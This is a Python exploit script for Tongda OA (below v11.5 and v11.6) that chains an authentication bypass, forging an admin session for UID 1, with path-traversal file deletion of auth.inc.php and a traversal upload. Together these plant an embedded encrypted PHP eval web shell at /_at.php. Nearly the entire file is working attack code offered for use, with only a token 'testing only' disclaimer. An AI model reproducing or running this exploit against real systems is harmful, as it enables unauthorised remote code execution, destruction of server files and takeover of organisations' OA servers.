#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
Author: Admintony
Date: 2020/08/23 16:38
适用版本：
通达OA < v11.5
通达OA v11.6

声明：使用即代表接受本协议，工具仅用于测试用途，请勿使用此工具做非法事情。
"""
import requests,sys,json
from random import choice

payload="""<?php
@error_reporting(0);
session_start();
if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else if(!empty($_SESSION['k']))
{
    $key=$_SESSION['k'];
    $post=file_get_contents("php://input");
    if(!extension_loaded('openssl'))
    {
        $t="base64_"."decode";
        $post=$t($post."");

        for($i=0;$i<strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&15];
                }
    }
    else
    {
        $post=openssl_decrypt($post, "AES128", $key);
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __construct($p) {eval($p."");}}
    @new C($params);
}
?>
"""
USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
]
headers={}

""" 11.6版本 getshell利用链 """
def getShellV11_6(target):
    print("[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA")
    input("Press enter to continue")
    print("[*]Deleting auth.inc.php....")
    url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
    requests.get(url=url,verify=False)
    print("[*]Checking if file deleted...")
    url=target+"/inc/auth.inc.php"
    page=requests.get(url=url,verify=False).text
    if 'No input file specified.' not in page:
        print("[-]Failed to deleted auth.inc.php")
        exit(-1)
    print("[+]Successfully deleted auth.inc.php!")
    print("[*]Uploading payload...")
    url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
    files = {'FILE1': ('at.php', payload)}
    res=requests.post(url=url,files=files,verify=False)
    url=target+"/_at.php"
    page=requests.get(url=url,verify=False).text
    if 'No input file specified.' not in page:
        print("[+]Filed Uploaded Successfully")
        print("[+]URL:",url)
    else:
        print("[-]Failed to upload file")

""" 低于11.5版本 getshell利用链 """
def getShellV11_x(target):
    cookie=getV11Session(target)
    if not cookie:
        print("[-] Failed to get Session")
        return
    headers={"Cookie":cookie+";_SERVER="}
    print("[*]Uploading payload...")
    url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
    files = {'FILE1': ('at.php', payload)}
    res=requests.post(url=url,files=files,headers=headers,verify=False)
    url=target+"/_at.php"
    page=requests.get(url=url,verify=False).text
    if 'No input file specified.' not in page:
        print("[+]Filed Uploaded Successfully")
        print("[+]URL:",url)
    else:
        print("[-]Failed to upload file")

"""
@判断目标版本
@return 116：11.6版本
@return 11：非11.6版本
"""
def getVersion(target):
    print("[*] Checking target's OA version")
    url=target+"/module/appbuilder/assets/print.php"
    res=requests.get(url,verify=False)
    if res.status_code==200:
        print("[*] Target's OA version: v11.6")
        return "116"
    else:
        print("[*] Target's OA version: is not v11.6")
        return "11"

""" OA未授权访问 """
def getV11Session(url):
    checkUrl = url+'/general/login_code.php'
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl,headers=headers)
        resText = str(res.text).split('{')
        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = url+'/logincheck_code.php'
        res = requests.post(
            getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers)
        print('[+]Get Available COOKIE:'+res.headers['Set-Cookie'])
        if testCookie(url,res.headers['Set-Cookie']) == 0:
            print("[-] Failed to login with this Cookie")
            return
        return res.headers['Set-Cookie']
    except Exception as e:
        print(e)
        print('[-] Something Wrong With '+url)
        return

""" 测试获取到的cookie是否可用 """
def testCookie(url,Cookie):
    uri = "/general/index.php?isIE=0&modify_pwd=0"
    headers = {
        "Cookie":Cookie
    }
    res = requests.get(url+uri,headers=headers)
    if "用户未登录，请重新登录!" in res.text:
        return 0

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("[*] python {} target_url".format(sys.argv[0]))
        exit()
    target=sys.argv[1]
    ver = getVersion(target)
    if ver=="116":
        getShellV11_6(target)
    elif ver=="11":
        getShellV11_x(target)